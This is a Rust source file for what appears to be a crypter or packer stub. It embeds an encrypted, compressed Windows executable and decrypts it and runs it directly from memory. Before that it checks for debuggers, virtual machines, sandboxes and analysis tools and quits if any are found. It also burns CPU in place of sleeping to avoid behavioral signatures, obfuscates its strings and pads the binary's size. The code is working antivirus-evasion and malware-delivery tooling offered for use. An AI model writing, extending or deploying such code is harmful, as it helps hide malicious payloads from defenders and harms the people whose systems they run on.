// #![windows_subsystem = "windows"] // Uncomment to link as a GUI-subsystem PE (no console window) 
mod generated;
mod logger;
use generated::{KEY, NONCE, DELAY_SECS, VERBOSE, ANALYSIS_DETECTION};
use std::error::Error;
use::std::time::{Duration, Instant};
use aes_gcm::{
    aead::{Aead, KeyInit},
    Aes256Gcm, Key, Nonce,
};
use std::convert::TryInto;
use busywork::{BusyWork, Categories, Intensity};
use obfstr::obfstr;
use rand::RngExt;

// Encrypted + zstd-compressed target PE, embedded at compile time.
static ENCRYPTED: &[u8] = include_bytes!("../payload.enc");

// Padding bytes for `--add-size`; never read, only referenced by `black_box`.
static PADDING: &[u8] = include_bytes!("../padding.bin");

fn analysis_detected() -> bool {
    // WARNING: unreliable standalone analysis check. The crate's heuristics
    // can be outdated, bypassed, or produce false negatives on modern or
    // custom-configured environments.
    //
    // `antilysis::detected()` returns true if ANY of the following is found:
    // - suspicious analysis processes (Wireshark, Procmon, pe-sieve, ...)
    // - debugger processes (x64dbg, WinDbg, ollydbg, ...)
    // - debugger APIs (IsDebuggerPresent, CheckRemoteDebuggerPresent, NTICE)
    // - VM driver files (VMware, VirtualBox)
    // - VM MAC address prefixes (00:05:69, 00:0C:29, 08:00:27, ...)
    // - known sandbox artifacts
    antilysis::detected().unwrap_or(false)
}

fn decompress() -> Result<Vec<u8>, std::io::Error> {
    zstd::decode_all(ENCRYPTED)
}

fn decrypt(ciphertext: &[u8]) -> Result<Vec<u8>, String> {
    let key: &Key<Aes256Gcm> = (&KEY).try_into().map_err(|_| "invalid key length")?;
    let cipher = Aes256Gcm::new(key);
    let nonce: &Nonce<_> = (&NONCE).try_into().map_err(|_| "invalid nonce length")?;
    let plaintext = cipher.decrypt(nonce, ciphertext).map_err(|e| format!("AES-GCM decrypt failed: {:?}", e))?;

    if VERBOSE {
        logger::log_info(obfstr!("Binary decrypted successfully."));
    }

    Ok(plaintext)
}

fn execute(pe_bytes: &[u8]) -> Result<(), Box<dyn Error>> {
    let module = maple_rs::Maple::load_executable_from_memory(pe_bytes).map_err(|e| format!("Failed to load executable: {e}"))?;
    module.execute_entry_point().map_err(|e| format!("Failed to execute entry point: {e}"))?;
    Ok(())
}

// Burn CPU/memory work for duration_secs instead of sleeping, to avoid
// the static "idle then act" behavioral signature.
fn behavior_misleading(duration_secs: u64) {
    let target = Duration::from_secs(duration_secs);
    let start = Instant::now();
    let worker = BusyWork::new(Intensity::High).allow(Categories::COMPUTE | Categories::MEMORY);

    while start.elapsed() < target {
        worker.run();
    }
}

fn delay_execution() {
    if DELAY_SECS > 0 {
        if VERBOSE {
            logger::log_info(&format!("{} {} seconds...", obfstr!("Delaying execution by"), DELAY_SECS));
        }
        behavior_misleading(DELAY_SECS);
    }
}

fn run() -> Result<(), Box<dyn Error>> {
    // Keep PADDING from being stripped by the linker in release builds.
    std::hint::black_box(&PADDING);

    delay_execution();

    if ANALYSIS_DETECTION && analysis_detected() {
        if VERBOSE {
            logger::log_info(obfstr!("VM detected. Exiting..."));
        }
        behavior_misleading(rand::rng().random_range(60..120)); // Random delay between 60 and 120 seconds
        return Ok(());
    }

    let ciphertext = decompress().map_err(|e| format!("Failed to decompress payload: {e}"))?;
    let pe_bytes = decrypt(&ciphertext).map_err(|_| "Failed to decrypt payload. The encrypted data may be corrupted or the key/nonce may be incorrect.")?;

    execute(&pe_bytes)?;

    Ok(())
}

fn main() {
    if let Err(error) = run() {
        if VERBOSE {
            logger::log_error(&format!("Error: {error}"));
        }
        std::process::exit(1);
    }
}
